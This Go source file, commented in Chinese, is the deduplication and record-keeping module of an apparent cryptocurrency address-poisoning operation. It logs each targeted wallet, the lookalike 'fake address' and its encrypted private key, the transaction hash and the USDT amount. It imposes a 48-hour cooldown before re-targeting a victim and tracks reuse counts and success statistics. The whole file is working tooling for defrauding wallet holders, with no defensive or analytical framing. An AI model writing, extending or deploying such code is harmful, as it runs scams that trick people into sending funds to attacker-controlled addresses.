package core

import (
	"context"
	"strings"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"go.uber.org/zap"
)

// DedupConfig 去重配置
type DedupConfig struct {
	CooldownHours int // 冷却时间 (小时), 默认48小时=2天
}

// DefaultDedupConfig 默认配置
func DefaultDedupConfig() DedupConfig {
	return DedupConfig{
		CooldownHours: 48, // 2天
	}
}

// Deduplicator 去重器 - 检查目标地址是否在冷却期内
type Deduplicator struct {
	db     *pgxpool.Pool
	logger *zap.Logger
	config DedupConfig
}

// NewDeduplicator 创建去重器
func NewDeduplicator(db *pgxpool.Pool, logger *zap.Logger, config DedupConfig) *Deduplicator {
	return &Deduplicator{
		db:     db,
		logger: logger,
		config: config,
	}
}

// PoisonRecord 投毒记录
type PoisonRecord struct {
	ID                  int64
	TargetAddress       string
	FakeAddress         string
	EncryptedPrivateKey []byte
	TxHash              string
	USDTAmount          float64
	Status              string
	SentAt              time.Time
}

// CheckCooldown 检查目标地址是否在冷却期内
// 返回: (在冷却期内, 最近一条记录, 错误)
func (d *Deduplicator) CheckCooldown(ctx context.Context, targetAddress string) (bool, *PoisonRecord, error) {
	addr := strings.ToLower(strings.TrimPrefix(targetAddress, "0x"))

	// 使用 make_interval 函数避免字符串拼接问题
	var record PoisonRecord
	err := d.db.QueryRow(ctx, `
		SELECT id, target_address, fake_address, encrypted_private_key,
		       COALESCE(tx_hash, ''), COALESCE(usdt_amount, 0), status, sent_at
		FROM poison_records
		WHERE target_address = $1
		  AND status = 'success'
		  AND sent_at > NOW() - make_interval(hours => $2)
		ORDER BY sent_at DESC
		LIMIT 1
	`, addr, d.config.CooldownHours).Scan(
		&record.ID, &record.TargetAddress, &record.FakeAddress,
		&record.EncryptedPrivateKey, &record.TxHash, &record.USDTAmount,
		&record.Status, &record.SentAt,
	)

	if err != nil {
		if err.Error() == "no rows in result set" {
			return false, nil, nil // 不在冷却期
		}
		return false, nil, err
	}

	// 找到记录，在冷却期内
	return true, &record, nil
}

// RecordPoison 记录投毒
func (d *Deduplicator) RecordPoison(ctx context.Context, record PoisonRecord) (int64, error) {
	var id int64
	err := d.db.QueryRow(ctx, `
		INSERT INTO poison_records 
		(target_address, fake_address, encrypted_private_key, tx_hash, usdt_amount, status, sent_at)
		VALUES ($1, $2, $3, $4, $5, $6, NOW())
		RETURNING id
	`,
		strings.ToLower(strings.TrimPrefix(record.TargetAddress, "0x")),
		strings.ToLower(strings.TrimPrefix(record.FakeAddress, "0x")),
		record.EncryptedPrivateKey,
		record.TxHash,
		record.USDTAmount,
		record.Status,
	).Scan(&id)
	return id, err
}

// UpdateStatus 更新记录状态
func (d *Deduplicator) UpdateStatus(ctx context.Context, id int64, status, txHash string, gasUsed, gasPrice int64) error {
	_, err := d.db.Exec(ctx, `
		UPDATE poison_records 
		SET status = $2, tx_hash = $3, gas_used = $4, gas_price = $5, confirmed_at = NOW()
		WHERE id = $1
	`, id, status, txHash, gasUsed, gasPrice)
	return err
}

// GetRecentRecords 获取最近N条记录
func (d *Deduplicator) GetRecentRecords(ctx context.Context, limit int) ([]PoisonRecord, error) {
	rows, err := d.db.Query(ctx, `
		SELECT id, target_address, fake_address, COALESCE(tx_hash, ''), 
		       COALESCE(usdt_amount, 0), status, sent_at
		FROM poison_records 
		ORDER BY sent_at DESC
		LIMIT $1
	`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var records []PoisonRecord
	for rows.Next() {
		var r PoisonRecord
		err := rows.Scan(&r.ID, &r.TargetAddress, &r.FakeAddress,
			&r.TxHash, &r.USDTAmount, &r.Status, &r.SentAt)
		if err != nil {
			continue
		}
		records = append(records, r)
	}
	return records, nil
}

// GetStats 获取统计
func (d *Deduplicator) GetStats(ctx context.Context) (total, success, failed, pending int64, err error) {
	err = d.db.QueryRow(ctx, "SELECT COUNT(*) FROM poison_records").Scan(&total)
	if err != nil {
		return
	}
	d.db.QueryRow(ctx, "SELECT COUNT(*) FROM poison_records WHERE status='success'").Scan(&success)
	d.db.QueryRow(ctx, "SELECT COUNT(*) FROM poison_records WHERE status='failed'").Scan(&failed)
	d.db.QueryRow(ctx, "SELECT COUNT(*) FROM poison_records WHERE status='pending'").Scan(&pending)
	return
}

// RecordUsedFakeAddress 记录已使用的伪造地址（发送成功后调用）
func (d *Deduplicator) RecordUsedFakeAddress(ctx context.Context, fakeAddress string, encryptedPrivateKey []byte) error {
	addr := strings.ToLower(strings.TrimPrefix(fakeAddress, "0x"))
	_, err := d.db.Exec(ctx, `
		INSERT INTO used_fake_addresses (address, encrypted_private_key, use_count, first_used_at, last_used_at)
		VALUES ($1, $2, 1, NOW(), NOW())
		ON CONFLICT (address) DO UPDATE SET
			use_count = used_fake_addresses.use_count + 1,
			last_used_at = NOW()
	`, addr, encryptedPrivateKey)
	return err
}
